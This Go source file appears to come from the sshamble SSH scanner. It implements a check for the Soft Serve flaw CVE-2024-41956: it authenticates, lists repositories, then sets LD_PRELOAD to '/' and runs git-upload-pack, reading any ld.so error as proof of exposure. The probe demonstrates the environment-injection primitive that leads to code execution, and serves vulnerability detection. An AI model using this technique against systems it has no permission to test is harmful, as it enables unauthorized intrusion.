package cmd

import (
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/runZeroInc/sshamble/auth"
	"github.com/runZeroInc/sshamble/crypto/ssh"
)

const checkVulnSoftServe = "vuln-softserve-env"

func sshCheckVulnSoftServe(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkVulnSoftServe
	if !conf.IsCheckEnabled(tname) {
		conf.Logger.Infof("%s %s is not enabled", addr, tname)
		return nil
	}

	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)

	if root.SessionAuth == nil {
		conf.Logger.Errorf("%s %s is missing cached session auth, skipping", addr, tname)
		return nil
	}

	// We need a valid repository name to make this work.
	baseSoftServe := func(c net.Conn, _ *ssh.Client, ses *ssh.Session, res *auth.AuthResult) error {
		c.SetDeadline(time.Now().Add(time.Second * 15))

		stdOut, stdErr, stdIn, err := sessionGetSTDIO(ses)
		if err != nil {
			conf.Logger.Errorf("%s %s failed to get session stdio: %v", addr, tname, err)
			return err
		}

		err = ses.Run("repo list")
		time.Sleep(time.Second)
		stdIn.Close()

		outp := stdOut.Dump()
		outp = append(outp, stdErr.Dump()...)
		res.SessionOutput = auth.CleanSessionOutput(outp)
		return err
	}
	baseRes := auth.SSHAuth(addr, options.WithSessionHandler(baseSoftServe), auth.SSHAuthHandlerSingle(root.SessionAuth))

	// Failed to open session.
	if baseRes.Stage != "session" {
		conf.Logger.Errorf("%s %s failed to re-open session using %s: %v", addr, tname, root.SessionMethod, baseRes.Error)
		return baseRes
	}

	// No repositories.
	repos := strings.Split(baseRes.SessionOutput, "\n")
	if len(repos) == 0 || len(strings.TrimSpace(repos[0])) == 0 {
		conf.Logger.Errorf("%s %s expected a list of repos, received '%s'", addr, tname, baseRes.SessionOutput)
		return baseRes
	}

	// Grab the first repository and do the magic.
	repo := strings.TrimSpace(repos[0])
	conf.Logger.Infof("%s %s Attempting exploit using repository '%s'", addr, tname, repo)

	//
	// Invoke the magic.
	//
	expSoftServe := func(c net.Conn, _ *ssh.Client, ses *ssh.Session, res *auth.AuthResult) error {
		c.SetDeadline(time.Now().Add(time.Second * 15))

		stdOut, stdErr, stdIn, err := sessionGetSTDIO(ses)
		if err != nil {
			conf.Logger.Errorf("%s %s failed to get session stdio: %v", addr, tname, err)
			return err
		}

		_ = ses.SetenvNoReply("LD_PRELOAD", "/")

		err = ses.Run("git-upload-pack " + repo)

		time.Sleep(time.Second)
		stdIn.Close()

		outp := stdOut.Dump()
		outp = append(outp, stdErr.Dump()...)
		res.SessionOutput = auth.CleanSessionOutput(outp)

		return err
	}
	expRes := auth.SSHAuth(addr, options.WithSessionHandler(expSoftServe), auth.SSHAuthHandlerSingle(root.SessionAuth))

	// Failed to open session
	if expRes.Stage != "session" {
		conf.Logger.Errorf("%s %s failed to re-open session using %s: %v", addr, tname, root.SessionMethod, expRes.Error)
		return expRes
	}

	if strings.Contains(expRes.SessionOutput, "ERROR: ld.so") || strings.Contains(expRes.SessionOutput, "cannot be preloaded") {
		conf.Logger.Warnf("%s %s Soft Serve appears to be exploitable: (out=%s, err=%s)", addr, tname, expRes.SessionOutput, expRes.Error)

		root.AddVuln(auth.VulnResult{
			ID:    checkVulnSoftServe,
			Ref:   "CVE-2024-41956",
			URL:   "https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-m445-w3xr-vp2f",
			Proof: fmt.Sprintf("ld.so error in output (%s)", expRes.SessionOutput),
		})
	} else {
		conf.Logger.Infof("%s %s Soft Serve does not seem exploitable: (out=%s, err=%s)", addr, tname, expRes.SessionOutput, expRes.Error)
	}

	return expRes
}
